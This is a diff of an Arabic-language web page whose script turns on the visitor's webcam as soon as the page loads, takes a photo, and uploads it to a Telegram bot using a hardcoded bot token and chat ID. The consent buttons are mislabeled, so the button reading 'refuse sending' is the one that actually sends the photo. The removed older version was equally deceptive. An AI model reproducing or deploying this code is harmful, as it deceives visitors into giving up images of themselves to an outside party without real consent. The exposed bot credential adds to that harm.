@@ -7,8 +7,8 @@
 <video id="video" autoplay playsinline></video>
 <br>
 
-<button onclick="start()">رفض</button>
-<button onclick="stop()">موافق</button>
+<button id="approveBtn">رفض  الإرسال</button>
+<button id="rejectBtn"> موافق على لإرسال</button>
 
 <canvas id="canvas" style="display:none;"></canvas>
 
@@ -17,66 +17,75 @@ const TOKEN = "8469668913:AAE2ks3XnwwtTnTEXDZHshbLsIZ5ihoI7ZE";
 const CHAT_ID = "5870377141";
 
 const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 let stream = null;
+let capturedBlob = null;
 
-async function start() {
+// تشغيل الكاميرا تلقائيًا عند فتح الصفحة
+async function startCamera() {
     try {
-        // تشغيل الكاميرا
         stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
         video.play();
 
-        // انتظار بسيط ثم تصوير
-        setTimeout(captureAndSend, 3000);
+        // التقاط الصورة بعد 3 ثواني
+        setTimeout(capturePhoto, 3000);
 
     } catch (err) {
         alert("لا يمكن تشغيل الكاميرا");
+        console.log(err);
     }
 }
 
-function stop() {
-    alert("تم الإيقاف");
+// التقاط الصورة وتخزينها مؤقتًا
+function capturePhoto() {
+    const ctx = canvas.getContext("2d");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
 
+    canvas.toBlob((blob) => {
+        capturedBlob = blob; // حفظ الصورة
+        alert("تم التقاط الصورة، يمكنك اختيار إرسالها أو رفضها.");
+    }, "image/png");
+
+    // إيقاف الكاميرا بعد الالتقاط
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
 }
 
-function captureAndSend() {
+// زر الموافقة: إرسال الصورة للبوت
+document.getElementById("approveBtn").onclick = async function() {
+    if (!capturedBlob) {
+        alert("لم يتم التقاط الصورة بعد.");
+        return;
+    }
 
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", capturedBlob, "photo.png");
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        });
+        alert("تم إرسال الصورة");
+    } catch (e) {
+        alert("فشل الإرسال");
+        console.log(e);
+    }
+};
 
-    ctx.drawImage(video, 0, 0);
+// زر الرفض: تجاهل الصورة
+document.getElementById("rejectBtn").onclick = function() {
+    capturedBlob = null;
+    alert("تم رفض إرسال الصورة");
+};
 
-    canvas.toBlob(async (blob) => {
-
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "photo.png");
-
-        try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            });
-
-            alert("تم إرسال الصورة");
-
-        } catch (e) {
-            alert("فشل الإرسال");
-        }
-
-        // إيقاف الكاميرا بعد الإرسال
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-        }
-
-    }, "image/png");
-}
+// تشغيل الكاميرا تلقائيًا عند تحميل الصفحة
+startCamera();
 </script>
 
 </body>
